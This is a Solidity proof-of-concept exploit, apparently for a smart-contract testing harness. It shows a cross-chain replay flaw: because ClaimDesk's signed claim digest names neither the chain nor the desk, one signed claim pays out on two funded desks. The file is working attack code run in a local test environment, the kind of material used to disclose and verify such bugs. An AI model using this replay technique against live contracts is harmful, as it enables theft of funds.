// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {AssayPoC} from "assay/AssayExploit.sol";
import {ClaimDesk} from "../src/ClaimDesk.sol";

/// @notice Cross-chain replay: the digest of a claim names neither the chain nor the desk, so a
///         claim that the issuer signed for the desk on one chain pays on the desk of another
///         chain too. The nonce is tracked per desk, so it does not stop the second payment.
/// Knobs:
///   0 `other_chain`  the chain id of the second desk;
///   1 `amount`       the amount of the claim, in wei.
/// The attacker holds one claim, signed for the desk on chain 1. It cashes it in there, as
/// intended, and then presents the same signature to the desk on the other chain.
contract ClaimDeskCrossChainPoC is AssayPoC {
    uint256 private constant ISSUER_KEY = 0x155EED;
    uint256 private constant HOME_CHAIN = 1;
    uint256 private constant NONCE = 7;

    ClaimDesk internal homeDesk;
    ClaimDesk internal otherDesk;

    function setUpTarget() internal override {
        address issuer = vm.addr(ISSUER_KEY);
        homeDesk = new ClaimDesk(issuer);
        otherDesk = new ClaimDesk(issuer);
        address treasury = makeAddr("treasury");
        vm.deal(treasury, 20 ether);
        vm.startPrank(treasury);
        homeDesk.fund{value: 10 ether}();
        otherDesk.fund{value: 10 ether}();
        vm.stopPrank();

        declareKnob(0, "other_chain", 10, 1, 16);
        declareKnob(1, "amount", 1 ether, 1, 5 ether);
    }

    function exploit() internal override {
        uint256 amount = knob(1);

        vm.chainId(HOME_CHAIN);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ISSUER_KEY, homeDesk.claimDigest(attacker, amount, NONCE));
        vm.prank(attacker);
        homeDesk.claim(attacker, amount, NONCE, v, r, s);

        // What the claim entitles the attacker to is now in its hands.
        uint256 balanceBefore = attacker.balance;
        vm.chainId(knob(0));
        vm.prank(attacker);
        otherDesk.claim(attacker, amount, NONCE, v, r, s);

        attacker_profit("eth", balanceBefore, attacker.balance);
    }
}
